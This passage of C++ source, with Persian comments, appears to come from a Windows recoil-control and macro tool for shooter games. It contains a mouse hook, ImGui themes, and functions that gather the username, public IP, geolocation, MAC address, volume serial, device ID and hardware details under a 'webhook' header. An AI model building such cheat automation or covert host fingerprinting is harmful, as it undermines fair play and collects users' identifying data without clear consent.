            if (vkCode != 0 && vkCode == g_door_unlock_trigger_key && (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN || wParam == WM_MBUTTONDOWN || wParam == WM_XBUTTONDOWN)) {
                 // Trigger the door unlock sequence in a new thread
                 // Detach the thread as we don't need to wait for it to finish
                 std::thread(perform_door_unlock_sequence, g_door_unlock_code).detach();

            }

            // --- Existing Recoil Trigger Logic ---
            // Get the configured VK codes for LMB and RMB
            int lmb_vk = g_lmb_key.load(std::memory_order_relaxed);
            int rmb_vk = g_rmb_key.load(std::memory_order_relaxed);
            bool auto_crouch_scope_enabled = g_auto_crouch_scope_enabled.load(std::memory_order_relaxed);

            // Check if the incoming button event matches the configured LMB or RMB key
            switch (wParam) {
                case WM_LBUTTONDOWN: if (lmb_vk == VK_LBUTTON) left_mouse_down.store(true, std::memory_order_relaxed); if (rmb_vk == VK_LBUTTON) right_mouse_down.store(true, std::memory_order_relaxed); break;
                case WM_LBUTTONUP:   if (lmb_vk == VK_LBUTTON) left_mouse_down.store(false, std::memory_order_relaxed); if (rmb_vk == VK_LBUTTON) right_mouse_down.store(false, std::memory_order_relaxed); stop_recoil_flag.store(true); break;
                case WM_RBUTTONDOWN: 
                    if (lmb_vk == VK_RBUTTON) left_mouse_down.store(true, std::memory_order_relaxed); 
                    if (rmb_vk == VK_RBUTTON) {
                        right_mouse_down.store(true, std::memory_order_relaxed);
                        // Auto Crouch Scope: Press CTRL when RMB is pressed
                        if (auto_crouch_scope_enabled) {
                            press_key_vk(VK_LCONTROL);
                            output_log_message("[DEBUG] Auto Crouch Scope: CTRL pressed with RMB\n");
                        }
                    }
                    break;
                case WM_RBUTTONUP:   
                    if (lmb_vk == VK_RBUTTON) left_mouse_down.store(false, std::memory_order_relaxed); 
                    if (rmb_vk == VK_RBUTTON) {
                        right_mouse_down.store(false, std::memory_order_relaxed);
                        // Auto Crouch Scope: Release CTRL when RMB is released
                        if (auto_crouch_scope_enabled) {
                            release_key_vk(VK_LCONTROL);
                            output_log_message("[DEBUG] Auto Crouch Scope: CTRL released with RMB\n");
                        }
                    }
                    stop_recoil_flag.store(true); 
                    break;
                case WM_MBUTTONDOWN: if (lmb_vk == VK_MBUTTON) left_mouse_down.store(true, std::memory_order_relaxed); if (rmb_vk == VK_MBUTTON) right_mouse_down.store(true, std::memory_order_relaxed); break;
                case WM_MBUTTONUP:   if (lmb_vk == VK_MBUTTON) left_mouse_down.store(false, std::memory_order_relaxed); if (rmb_vk == VK_MBUTTON) right_mouse_down.store(false, std::memory_order_relaxed); stop_recoil_flag.store(true); break;
                case WM_XBUTTONDOWN:
                    if (GET_XBUTTON_WPARAM(msStruct->mouseData) == XBUTTON1) {
                        if (lmb_vk == VK_XBUTTON1) left_mouse_down.store(true, std::memory_order_relaxed);
                        if (rmb_vk == VK_XBUTTON1) right_mouse_down.store(true, std::memory_order_relaxed);
                    } else if (GET_XBUTTON_WPARAM(msStruct->mouseData) == XBUTTON2) {
                        if (lmb_vk == VK_XBUTTON2) left_mouse_down.store(true, std::memory_order_relaxed);
                        if (rmb_vk == VK_XBUTTON2) right_mouse_down.store(true, std::memory_order_relaxed); // Assuming RMB is for ADS
                    }
                    break;
                case WM_XBUTTONUP:
                     if (GET_XBUTTON_WPARAM(msStruct->mouseData) == XBUTTON1) {
                         if (lmb_vk == VK_XBUTTON1) left_mouse_down.store(false, std::memory_order_relaxed);
                         if (rmb_vk == VK_XBUTTON1) right_mouse_down.store(false, std::memory_order_relaxed);
                     } else if (GET_XBUTTON_WPARAM(msStruct->mouseData) == XBUTTON2) {
                         if (lmb_vk == VK_XBUTTON2) left_mouse_down.store(false, std::memory_order_relaxed);
                         if (rmb_vk == VK_XBUTTON2) right_mouse_down.store(false, std::memory_order_relaxed);
                     }
                     stop_recoil_flag.store(true);
                     break;
            }
        }
    }
    return CallNextHookEx(mouse_hook, nCode, wParam, lParam);
}


// --- ImGui Helpers ---
// توابع انیمیشن و جلوه‌های بصری

// تابع برای محاسبه مقدار انیمیشن با تابع آسان‌شونده
float EaseOutQuad(float t) {
    return t * (2.0f - t);
}

float EaseInOutQuad(float t) {
    return t < 0.5f ? 2.0f * t * t : 1.0f - pow(-2.0f * t + 2.0f, 2.0f) / 2.0f;
}

// ساختار برای نگهداری وضعیت انیمیشن تب‌ها
struct TabAnimation {
    int lastTab = 0;           // تب قبلی
    int currentTab = 0;        // تب فعلی
    float animationProgress = 1.0f; // پیشرفت انیمیشن (0.0 تا 1.0)
    std::chrono::steady_clock::time_point lastChangeTime; // زمان آخرین تغییر
    float animationDuration = 0.3f; // مدت انیمیشن به ثانیه
};

// متغیر جهانی برای انیمیشن تب‌ها
TabAnimation g_tabAnimation;

// تابع برای به‌روزرسانی و رندر انیمیشن تب‌ها
bool UpdateTabAnimation(int newTabIndex) {
    auto currentTime = std::chrono::steady_clock::now();
    
    // اگر تب تغییر کرده است
    if (newTabIndex != g_tabAnimation.currentTab) {
        g_tabAnimation.lastTab = g_tabAnimation.currentTab;
        g_tabAnimation.currentTab = newTabIndex;
        g_tabAnimation.lastChangeTime = currentTime;
        g_tabAnimation.animationProgress = 0.0f;
        return true; // انیمیشن شروع شد
    }
    
    // به‌روزرسانی پیشرفت انیمیشن
    float elapsedTime = std::chrono::duration<float>(currentTime - g_tabAnimation.lastChangeTime).count();
    g_tabAnimation.animationProgress = std::min(elapsedTime / g_tabAnimation.animationDuration, 1.0f);
    
    return g_tabAnimation.animationProgress < 1.0f; // آیا انیمیشن هنوز در حال اجراست؟
}

// تابع برای رندر انیمیشن دکمه
void RenderButtonAnimation(const char* label, const ImVec2& size, std::function<void()> onClick) {
    static std::map<std::string, float> buttonAnimations;
    static std::map<std::string, std::chrono::steady_clock::time_point> buttonClickTimes;
    
    std::string buttonId = label;
    auto currentTime = std::chrono::steady_clock::now();
    
    // اگر دکمه در حافظه نیست، اضافه کن
    if (buttonAnimations.find(buttonId) == buttonAnimations.end()) {
        buttonAnimations[buttonId] = 0.0f;
        buttonClickTimes[buttonId] = currentTime;
    }
    
    // به‌روزرسانی انیمیشن
    float& animProgress = buttonAnimations[buttonId];
    auto& lastClickTime = buttonClickTimes[buttonId];
    
    float elapsedTime = std::chrono::duration<float>(currentTime - lastClickTime).count();
    animProgress = std::max(0.0f, animProgress - elapsedTime * 2.0f); // کاهش تدریجی
    
    // ذخیره زمان فعلی برای دفعه بعد
    lastClickTime = currentTime;
    
    // تنظیم رنگ‌ها براساس انیمیشن
    ImVec4 baseColor = ImGui::GetStyle().Colors[ImGuiCol_Button];
    ImVec4 activeColor = ImGui::GetStyle().Colors[ImGuiCol_ButtonActive];
    ImVec4 currentColor = ImVec4(
        baseColor.x + (activeColor.x - baseColor.x) * animProgress,
        baseColor.y + (activeColor.y - baseColor.y) * animProgress,
        baseColor.z + (activeColor.z - baseColor.z) * animProgress,
        baseColor.w
    );
    
    ImGui::PushStyleColor(ImGuiCol_Button, currentColor);
    
    // رندر دکمه
    bool clicked = ImGui::Button(label, size);
    
    ImGui::PopStyleColor();
    
    // اگر کلیک شد، انیمیشن را فعال کن و عملیات را اجرا کن
    if (clicked) {
        animProgress = 1.0f; // شروع انیمیشن
        if (onClick) onClick();
    }
}

// تابع جدید برای تنظیم تم رنگی سفارشی
void SetCustomTheme()
{
    ImGuiStyle& style = ImGui::GetStyle();
    
    // رنگ‌های اصلی با تم تیره و نئون
    ImVec4* colors = style.Colors;
    colors[ImGuiCol_Text]                   = ImVec4(1.00f, 1.00f, 1.00f, 1.00f);
    colors[ImGuiCol_TextDisabled]           = ImVec4(0.50f, 0.50f, 0.50f, 1.00f);
    colors[ImGuiCol_WindowBg]               = ImVec4(0.10f, 0.10f, 0.15f, 0.95f);
    colors[ImGuiCol_ChildBg]                = ImVec4(0.12f, 0.12f, 0.18f, 0.60f);
    colors[ImGuiCol_PopupBg]                = ImVec4(0.08f, 0.08f, 0.12f, 0.94f);
    colors[ImGuiCol_Border]                 = ImVec4(0.43f, 0.43f, 0.50f, 0.50f);
    colors[ImGuiCol_BorderShadow]           = ImVec4(0.00f, 0.00f, 0.00f, 0.00f);
    colors[ImGuiCol_FrameBg]                = ImVec4(0.20f, 0.20f, 0.30f, 0.54f);
    colors[ImGuiCol_FrameBgHovered]         = ImVec4(0.40f, 0.20f, 0.60f, 0.40f);
    colors[ImGuiCol_FrameBgActive]          = ImVec4(0.35f, 0.35f, 0.65f, 0.67f);
    colors[ImGuiCol_TitleBg]                = ImVec4(0.15f, 0.15f, 0.25f, 1.00f);
    colors[ImGuiCol_TitleBgActive]          = ImVec4(0.20f, 0.20f, 0.35f, 1.00f);
    colors[ImGuiCol_TitleBgCollapsed]       = ImVec4(0.15f, 0.15f, 0.25f, 0.75f);
    colors[ImGuiCol_MenuBarBg]              = ImVec4(0.15f, 0.15f, 0.25f, 0.47f);
    colors[ImGuiCol_ScrollbarBg]            = ImVec4(0.15f, 0.15f, 0.25f, 1.00f);
    colors[ImGuiCol_ScrollbarGrab]          = ImVec4(0.50f, 0.25f, 0.75f, 0.31f);
    colors[ImGuiCol_ScrollbarGrabHovered]   = ImVec4(0.60f, 0.30f, 0.90f, 0.78f);
    colors[ImGuiCol_ScrollbarGrabActive]    = ImVec4(0.70f, 0.40f, 1.00f, 1.00f);
    colors[ImGuiCol_CheckMark]              = ImVec4(0.90f, 0.50f, 1.00f, 0.83f);
    colors[ImGuiCol_SliderGrab]             = ImVec4(0.70f, 0.40f, 0.90f, 0.24f);
    colors[ImGuiCol_SliderGrabActive]       = ImVec4(0.80f, 0.50f, 1.00f, 1.00f);
    colors[ImGuiCol_Button]                 = ImVec4(0.35f, 0.25f, 0.65f, 0.59f);
    colors[ImGuiCol_ButtonHovered]          = ImVec4(0.50f, 0.30f, 0.80f, 0.80f);
    colors[ImGuiCol_ButtonActive]           = ImVec4(0.60f, 0.35f, 0.90f, 1.00f);
    colors[ImGuiCol_Header]                 = ImVec4(0.40f, 0.25f, 0.70f, 0.45f);
    colors[ImGuiCol_HeaderHovered]          = ImVec4(0.50f, 0.30f, 0.80f, 0.80f);
    colors[ImGuiCol_HeaderActive]           = ImVec4(0.60f, 0.35f, 0.90f, 1.00f);
    colors[ImGuiCol_Separator]              = ImVec4(0.50f, 0.25f, 0.75f, 0.33f);
    colors[ImGuiCol_SeparatorHovered]       = ImVec4(0.60f, 0.30f, 0.85f, 0.67f);
    colors[ImGuiCol_SeparatorActive]        = ImVec4(0.70f, 0.40f, 0.95f, 1.00f);
    colors[ImGuiCol_ResizeGrip]             = ImVec4(0.70f, 0.40f, 0.90f, 0.20f);
    colors[ImGuiCol_ResizeGripHovered]      = ImVec4(0.70f, 0.40f, 0.90f, 0.67f);
    colors[ImGuiCol_ResizeGripActive]       = ImVec4(0.80f, 0.50f, 1.00f, 0.95f);
    colors[ImGuiCol_Tab]                    = ImVec4(0.30f, 0.20f, 0.50f, 0.86f);
    colors[ImGuiCol_TabHovered]             = ImVec4(0.60f, 0.35f, 0.90f, 0.80f);
    colors[ImGuiCol_TabActive]              = ImVec4(0.50f, 0.30f, 0.80f, 1.00f);
    colors[ImGuiCol_TabUnfocused]           = ImVec4(0.25f, 0.15f, 0.40f, 0.97f);
    colors[ImGuiCol_TabUnfocusedActive]     = ImVec4(0.30f, 0.20f, 0.50f, 1.00f);
    
    // تنظیم استایل‌های دیگر
    style.WindowPadding     = ImVec2(10, 10);
    style.FramePadding      = ImVec2(8, 4);
    style.ItemSpacing       = ImVec2(10, 8);
    style.ItemInnerSpacing  = ImVec2(5, 6);
    style.TouchExtraPadding = ImVec2(0, 0);
    style.IndentSpacing     = 25.0f;
    style.ScrollbarSize     = 15.0f;
    style.GrabMinSize       = 10.0f;

    // گرد کردن گوشه‌ها
    style.WindowRounding    = 10.0f;
    style.ChildRounding     = 8.0f;
    style.FrameRounding     = 6.0f;
    style.PopupRounding     = 6.0f;
    style.ScrollbarRounding = 10.0f;
    style.GrabRounding      = 6.0f;
    style.TabRounding       = 8.0f;

    // تنظیم ضخامت خطوط
    style.WindowBorderSize = 1.0f;
    style.ChildBorderSize  = 1.0f;
    style.PopupBorderSize  = 1.0f;
    style.FrameBorderSize  = 0.0f;
    style.TabBorderSize    = 0.0f;
}

// تابع جدید برای تنظیم تم ورزشی
void SetSportTheme()
{
    ImGuiStyle& style = ImGui::GetStyle();
    
    // رنگ‌های اصلی با تم ورزشی (سبز و آبی)
    ImVec4* colors = style.Colors;
    colors[ImGuiCol_Text]                   = ImVec4(1.00f, 1.00f, 1.00f, 1.00f); // متن سفید
    colors[ImGuiCol_TextDisabled]           = ImVec4(0.60f, 0.60f, 0.60f, 1.00f);
    colors[ImGuiCol_WindowBg]               = ImVec4(0.05f, 0.15f, 0.10f, 0.95f); // پس‌زمینه سبز تیره
    colors[ImGuiCol_ChildBg]                = ImVec4(0.10f, 0.20f, 0.15f, 0.60f);
    colors[ImGuiCol_PopupBg]                = ImVec4(0.08f, 0.18f, 0.12f, 0.94f);
    colors[ImGuiCol_Border]                 = ImVec4(0.43f, 0.50f, 0.43f, 0.50f);
    colors[ImGuiCol_BorderShadow]           = ImVec4(0.00f, 0.00f, 0.00f, 0.00f);
    colors[ImGuiCol_FrameBg]                = ImVec4(0.15f, 0.30f, 0.20f, 0.54f);
    colors[ImGuiCol_FrameBgHovered]         = ImVec4(0.20f, 0.40f, 0.30f, 0.40f);
    colors[ImGuiCol_FrameBgActive]          = ImVec4(0.25f, 0.45f, 0.35f, 0.67f);
    colors[ImGuiCol_TitleBg]                = ImVec4(0.15f, 0.25f, 0.15f, 1.00f);
    colors[ImGuiCol_TitleBgActive]          = ImVec4(0.20f, 0.35f, 0.20f, 1.00f);
    colors[ImGuiCol_TitleBgCollapsed]       = ImVec4(0.15f, 0.25f, 0.15f, 0.75f);
    colors[ImGuiCol_MenuBarBg]              = ImVec4(0.15f, 0.25f, 0.15f, 0.47f);
    colors[ImGuiCol_ScrollbarBg]            = ImVec4(0.15f, 0.25f, 0.15f, 1.00f);
    colors[ImGuiCol_ScrollbarGrab]          = ImVec4(0.25f, 0.50f, 0.35f, 0.31f);
    colors[ImGuiCol_ScrollbarGrabHovered]   = ImVec4(0.30f, 0.60f, 0.40f, 0.78f);
    colors[ImGuiCol_ScrollbarGrabActive]    = ImVec4(0.35f, 0.70f, 0.45f, 1.00f);
    colors[ImGuiCol_CheckMark]              = ImVec4(0.50f, 0.90f, 0.60f, 0.83f);
    colors[ImGuiCol_SliderGrab]             = ImVec4(0.40f, 0.70f, 0.50f, 0.24f);
    colors[ImGuiCol_SliderGrabActive]       = ImVec4(0.50f, 0.80f, 0.60f, 1.00f);
    colors[ImGuiCol_Button]                 = ImVec4(0.25f, 0.65f, 0.35f, 0.59f); // دکمه سبز
    colors[ImGuiCol_ButtonHovered]          = ImVec4(0.30f, 0.80f, 0.40f, 0.80f); // دکمه سبز روشن در حالت هاور
    colors[ImGuiCol_ButtonActive]           = ImVec4(0.35f, 0.90f, 0.45f, 1.00f); // دکمه سبز روشن‌تر در حالت کلیک
    colors[ImGuiCol_Header]                 = ImVec4(0.25f, 0.40f, 0.30f, 0.45f);
    colors[ImGuiCol_HeaderHovered]          = ImVec4(0.30f, 0.50f, 0.40f, 0.80f);
    colors[ImGuiCol_HeaderActive]           = ImVec4(0.35f, 0.60f, 0.45f, 1.00f);
    colors[ImGuiCol_Separator]              = ImVec4(0.25f, 0.50f, 0.35f, 0.33f);
    colors[ImGuiCol_SeparatorHovered]       = ImVec4(0.30f, 0.60f, 0.40f, 0.67f);
    colors[ImGuiCol_SeparatorActive]        = ImVec4(0.35f, 0.70f, 0.45f, 1.00f);
    colors[ImGuiCol_ResizeGrip]             = ImVec4(0.40f, 0.70f, 0.50f, 0.20f);
    colors[ImGuiCol_ResizeGripHovered]      = ImVec4(0.40f, 0.70f, 0.50f, 0.67f);
    colors[ImGuiCol_ResizeGripActive]       = ImVec4(0.50f, 0.80f, 0.60f, 0.95f);
    colors[ImGuiCol_Tab]                    = ImVec4(0.20f, 0.30f, 0.25f, 0.86f);
    colors[ImGuiCol_TabHovered]             = ImVec4(0.35f, 0.60f, 0.45f, 0.80f);
    colors[ImGuiCol_TabActive]              = ImVec4(0.30f, 0.50f, 0.40f, 1.00f);
    colors[ImGuiCol_TabUnfocused]           = ImVec4(0.15f, 0.25f, 0.20f, 0.97f);
    colors[ImGuiCol_TabUnfocusedActive]     = ImVec4(0.20f, 0.30f, 0.25f, 1.00f);
    
    // تنظیم استایل‌های دیگر
    style.WindowPadding     = ImVec2(10, 10);
    style.FramePadding      = ImVec2(8, 4);
    style.ItemSpacing       = ImVec2(10, 8);
    style.ItemInnerSpacing  = ImVec2(5, 6);
    style.TouchExtraPadding = ImVec2(0, 0);
    style.IndentSpacing     = 25.0f;
    style.ScrollbarSize     = 15.0f;
    style.GrabMinSize       = 10.0f;

    // گرد کردن گوشه‌ها
    style.WindowRounding    = 8.0f;
    style.ChildRounding     = 6.0f;
    style.FrameRounding     = 4.0f;
    style.PopupRounding     = 4.0f;
    style.ScrollbarRounding = 8.0f;
    style.GrabRounding      = 4.0f;
    style.TabRounding       = 6.0f;

    // تنظیم ضخامت خطوط
    style.WindowBorderSize = 1.0f;
    style.ChildBorderSize  = 1.0f;
    style.PopupBorderSize  = 1.0f;
    style.FrameBorderSize  = 0.0f;
    style.TabBorderSize    = 0.0f;
}

// Helper function from ImGui wiki/demo or common practice
static void HelpMarker(const char* desc)
{
    ImGui::TextDisabled("(?)"); // Display a small "(?)"
    if (ImGui::IsItemHovered(ImGuiHoveredFlags_AllowWhenDisabled)) // Check if the user is hovering over the "(?)"
    {
        ImGui::BeginTooltip(); // Start a tooltip window
        ImGui::PushTextWrapPos(ImGui::GetFontSize() * 35.0f); // Wrap text nicely
        ImGui::TextUnformatted(desc); // Display the help text
        ImGui::PopTextWrapPos();
        ImGui::EndTooltip(); // End the tooltip window
    }
}

[[maybe_unused]] static bool ToggleSwitch(const char* str_id, bool* v)
{
    ImVec2 p = ImGui::GetCursorScreenPos();
    float height = ImGui::GetFrameHeight();
    float width = height * 1.80f;
    float radius = height * 0.5f;

    ImGui::InvisibleButton(str_id, ImVec2(width, height));
    bool clicked = ImGui::IsItemClicked();
    if (clicked) {
        *v = !*v;
    }

    ImDrawList* draw_list = ImGui::GetWindowDrawList();

    ImU32 col_bg;
    if (*v) {
        col_bg = ImGui::GetColorU32(ImVec4(0.30f, 0.75f, 0.35f, 1.00f));
    } else {
        col_bg = ImGui::GetColorU32(ImVec4(0.35f, 0.35f, 0.35f, 1.00f));
    }

    draw_list->AddRectFilled(p, ImVec2(p.x + width, p.y + height), col_bg, radius);

    float t = *v ? 1.0f : 0.0f;
    float cx = p.x + radius + t * (width - 2.0f * radius);
    draw_list->AddCircleFilled(ImVec2(cx, p.y + radius), radius - 2.0f, ImGui::GetColorU32(ImVec4(1, 1, 1, 1)));

    return clicked;
}


// --- System Info and Webhook Functions ---

// Function to get current system time as string
std::string get_current_system_time_string() {
    auto now = std::chrono::system_clock::now();
    std::time_t tt = std::chrono::system_clock::to_time_t(now);
    std::tm tm;
#ifdef _MSC_VER
    localtime_s(&tm, &tt);
#else
    tm = *std::localtime(&tt); // Not thread-safe
#endif
    std::stringstream ss;
    ss << std::put_time(&tm, "%Y-%m-%d %H:%M:%S");
    return ss.str();
}

// Function to get current username
inline std::string get_username() {
    char username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    if (GetUserNameA(username, &username_len)) {
        return std::string(username);
    }
    return "unknown_user";
}

// Function to get current user IP
inline std::string get_user_ip() {
    HINTERNET hInternet = InternetOpen("IP Checker", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        return "unknown_ip";
    }

    // استفاده از چند سرویس مختلف برای اطمینان از دریافت IP
    const char* services[] = {
        "api.ipify.org",
        "ipinfo.io/ip",
        "ifconfig.me"
    };

    std::string ip = "unknown_ip";
    
    for (const char* service : services) {
        HINTERNET hConnect = InternetConnect(hInternet, service, INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (!hConnect) {
            continue;
        }

        HINTERNET hRequest = HttpOpenRequest(hConnect, "GET", "/", NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
        if (!hRequest) {
            InternetCloseHandle(hConnect);
            continue;
        }

        if (HttpSendRequest(hRequest, NULL, 0, NULL, 0)) {
            char buffer[256] = {0};
            DWORD bytesRead = 0;
            if (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
                buffer[bytesRead] = 0; // اطمینان از پایان رشته
                ip = buffer;
                
                // حذف کاراکترهای نامربوط (مانند \r\n)
                ip.erase(std::remove_if(ip.begin(), ip.end(), [](char c) { return c == '\r' || c == '\n' || c == ' '; }), ip.end());
                
                // بررسی معتبر بودن IP
                if (ip.length() > 0 && ip.length() < 46) { // IPv4 و IPv6 هر دو پشتیبانی می‌شوند
                    InternetCloseHandle(hRequest);
                    InternetCloseHandle(hConnect);
                    InternetCloseHandle(hInternet);
                    return ip;
                }
            }
        }

        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
    }

    InternetCloseHandle(hInternet);
    return ip;
}

inline std::string get_country_name_for_ip(const std::string& ip) {
    if (ip.empty() || ip == "Unknown" || ip == "unknown_ip") {
        return "Unknown";
    }

    try {
        std::string url = "http://ip-api.com/json/" + ip + "?fields=status,country,regionName,city,message";
        std::string response = HttpGetToString(url.c_str());

        if (response.empty()) {
            output_log_message("GeoIP: empty response from ip-api.com for IP: " + ip + "\n");
            return "Unknown";
        }

        auto j = nlohmann::json::parse(response);
        if (j.value("status", std::string("fail")) != "success") {
            std::string errMsg = j.value("message", std::string());
            if (!errMsg.empty()) {
                output_log_message("GeoIP: ip-api.com status != success for IP " + ip + ", message: " + errMsg + "\n");
            } else {
                output_log_message("GeoIP: ip-api.com status != success for IP " + ip + ", raw response: " + response + "\n");
            }
            return "Unknown";
        }

        std::string country = j.value("country", std::string());
        std::string region = j.value("regionName", std::string());
        std::string city = j.value("city", std::string());

        std::string full;
        if (!country.empty()) {
            full = country;
        }
        if (!region.empty()) {
            if (!full.empty()) full += ", ";
            full += region;
        }
        if (!city.empty()) {
            if (!full.empty()) full += ", ";
            full += city;
        }

        if (full.empty()) {
            output_log_message("GeoIP: ip-api.com returned success but country/region/city are empty for IP: " + ip + "\n");
            return "Unknown";
        }

        return full;
    } catch (const std::exception& ex) {
        output_log_message(std::string("GeoIP: exception while handling ip-api.com response for IP ") + ip + ": " + ex.what() + "\n");
    } catch (...) {
        output_log_message("GeoIP: unknown exception while handling ip-api.com response.\n");
    }

    return "Unknown";
}

// Function to get current computer name
std::string get_computer_name() {
    char computername[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD computername_len = MAX_COMPUTERNAME_LENGTH + 1;
    if (GetComputerName(computername, &computername_len)) {
        return computername;
    }
    return "Unknown Computer";
}

// Function to get MAC Address (already exists, using it)
std::string get_mac_address() {
    IP_ADAPTER_INFO AdapterInfo[16];
    DWORD dwBufLen = sizeof(AdapterInfo);

    DWORD dwStatus = GetAdaptersInfo(AdapterInfo, &dwBufLen);
    if (dwStatus != ERROR_SUCCESS) {
        return "UNKNOWN_MAC";
    }

    // Find the first active adapter with a MAC address
    PIP_ADAPTER_INFO pAdapterInfo = AdapterInfo;
    while (pAdapterInfo) {
        if (pAdapterInfo->AddressLength > 0) {
            std::stringstream ss;
            ss << std::hex << std::uppercase << std::setfill('0');
            for (UINT i = 0; i < pAdapterInfo->AddressLength; ++i) {
                ss << std::setw(2) << (int)pAdapterInfo->Address[i] << (i == pAdapterInfo->AddressLength - 1 ? "" : ":");
            }
            return ss.str();
        }
        pAdapterInfo = pAdapterInfo->Next;
    }

    return "UNKNOWN_MAC";
}

// Function to get Volume Serial Number of the system drive (usually C:\)
std::string get_volume_serial_number(const std::string& drive_letter = "C:\\") {
    DWORD serial_number = 0;
    // GetVolumeInformation requires a buffer for volume name and file system name, even if not used
    char volume_name[MAX_PATH + 1] = {0};
    char file_system_name[MAX_PATH + 1] = {0};
    DWORD max_component_length = 0;
    DWORD file_system_flags = 0;

    if (GetVolumeInformation(
        drive_letter.c_str(),
        volume_name, sizeof(volume_name),
        &serial_number,
        &max_component_length,
        &file_system_flags,
        file_system_name, sizeof(file_system_name)))
    {
        std::stringstream ss;
        ss << std::hex << std::uppercase << serial_number;
        return ss.str();
    }
    return "UNKNOWN_VOL";
}


// Function to generate a complex Device ID by combining multiple identifiers and hashing
std::string generate_device_id() {
    std::string mac = get_mac_address();
    std::string volume_serial = get_volume_serial_number();
    // Add other identifiers here if needed, e.g., CPU info, Motherboard serial (more complex)

    // Combine identifiers into a single string with separators
    std::string combined_data = "MAC:" + mac + "|VOL:" + volume_serial;
    // Example: Add username or computer name, though less secure
    // combined_data += "|USER:" + get_username() + "|COMP:" + get_computer_name();

    // Hash the combined string using SHA-256
    std::string hashed_device_id = picosha2::hash256_hex_string(combined_data);

    output_log_message("Generated Device ID (Hashed): " + hashed_device_id + "\n");
    return hashed_device_id;
}

// Function to get OS Version and Architecture
std::string get_os_info() {
    std::string os_version;

    // Use VersionHelper macros for easier checks
    if (IsWindows10OrGreater()) os_version = "Windows 10 or later";
    else if (IsWindows8Point1OrGreater()) os_version = "Windows 8.1 or later";
    else if (IsWindows8OrGreater()) os_version = "Windows 8 or later";
    else if (IsWindows7SP1OrGreater()) os_version = "Windows 7 SP1 or later";
    else if (IsWindows7OrGreater()) os_version = "Windows 7 or later";
    else if (IsWindowsVistaSP2OrGreater()) os_version = "Windows Vista SP2 or later";
    else if (IsWindowsVistaOrGreater()) os_version = "Windows Vista or later";
    else if (IsWindowsXPSP3OrGreater()) os_version = "Windows XP SP3 or later";
    else if (IsWindowsXPSP2OrGreater()) os_version = "Windows XP SP2 or later";
    else if (IsWindowsXPOrGreater()) os_version = "Windows XP or later";
    else os_version = "Unknown Windows Version";

    SYSTEM_INFO sysInfo;
    GetNativeSystemInfo(&sysInfo); // Use GetNativeSystemInfo for architecture

    std::string architecture;
    switch (sysInfo.wProcessorArchitecture) {
        case PROCESSOR_ARCHITECTURE_AMD64: architecture = "x64"; break;
        case PROCESSOR_ARCHITECTURE_ARM: architecture = "ARM"; break;
        case PROCESSOR_ARCHITECTURE_ARM64: architecture = "ARM64"; break;
        case PROCESSOR_ARCHITECTURE_IA64: architecture = "Itanium"; break;
        case PROCESSOR_ARCHITECTURE_INTEL: architecture = "x86"; break;
        default: architecture = "Unknown Architecture"; break;
    }

    return os_version + " (" + architecture + ")";
}

// Function to get basic CPU info (Processor Count)
std::string get_cpu_info() {
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    return std::to_string(sysInfo.dwNumberOfProcessors) + " logical cores";
}

// Function to get total physical RAM
std::string get_ram_info() {
    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    if (GlobalMemoryStatusEx(&memInfo)) {
        // Convert bytes to GB
        double total_gb = static_cast<double>(memInfo.ullTotalPhys) / (1024.0 * 1024.0 * 1024.0);
        std::stringstream ss;
        ss << std::fixed << std::setprecision(2) << total_gb << " GB";
        return ss.str();
    }
    return "Unknown RAM";
}

// Function to check network connectivity
std::string get_network_status() {
    DWORD flags;
    if (InternetGetConnectedState(&flags, 0)) {
        return "Connected";
    }
    return "Disconnected";
}

// --- New Helper Functions for System Info ---

// Function to get screen resolution
std::string get_screen_resolution() {
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    if (width > 0 && height > 0) {
        return std::to_string(width) + "x" + std::to_string(height);
    } else {
        return "Unknown Resolution";
    }
}

// تابع get_user_ip قبلاً در خط 2907 تعریف شده است

// Helper to format uptime from milliseconds
std::string format_uptime(ULONGLONG milliseconds) {
    if (milliseconds == 0) return "N/A";
    ULONGLONG total_seconds = milliseconds / 1000;
    ULONGLONG days = total_seconds / (24 * 3600);
    total_seconds %= (24 * 3600);
    ULONGLONG hours = total_seconds / 3600;
    total_seconds %= 3600;
    ULONGLONG minutes = total_seconds / 60;
    total_seconds %= 60;
    ULONGLONG seconds = total_seconds;

    std::stringstream ss;
    bool has_value = false;
    if (days > 0) { ss << days << "d "; has_value = true; }
    if (hours > 0 || has_value) { ss << hours << "h "; has_value = true; }
    if (minutes > 0 || has_value) { ss << minutes << "m "; has_value = true; }
    ss << seconds << "s";
    return ss.str();
}

// Function to get system uptime
std::string get_system_uptime() {
    ULONGLONG uptime_ms = GetTickCount64();
    return format_uptime(uptime_ms);
}

// Function to get GPU information
std::string get_gpu_info() {
    if (!g_pd3dDevice) {
         // Try creating a temporary DXGI Factory if D3D device isn't ready yet
         IDXGIFactory* pFactory = nullptr;
         HRESULT hr_fac = CreateDXGIFactory(__uuidof(IDXGIFactory), (void**)&pFactory);
         if (FAILED(hr_fac) || !pFactory) {
             return "Unknown GPU (DXGI Factory Creation Failed)";
         }

         IDXGIAdapter* pAdapter = nullptr;
         if (pFactory->EnumAdapters(0, &pAdapter) != DXGI_ERROR_NOT_FOUND) {
             DXGI_ADAPTER_DESC adapterDesc;
             HRESULT hr_desc = pAdapter->GetDesc(&adapterDesc);
             pAdapter->Release(); // Release adapter
             pFactory->Release(); // Release factory
             if (SUCCEEDED(hr_desc)) {
                 char gpuName[128];
                 size_t convertedChars = 0;
                 wcstombs_s(&convertedChars, gpuName, sizeof(gpuName), adapterDesc.Description, _TRUNCATE);
                 if (convertedChars > 0) {
                      return gpuName;
                 } else {
                      return "Unknown GPU (Name Conversion Failed)";
                 }
             } else {
                 return "Unknown GPU (Failed to Get Adapter Desc)";
             }
         } else {
              pFactory->Release(); // Release factory
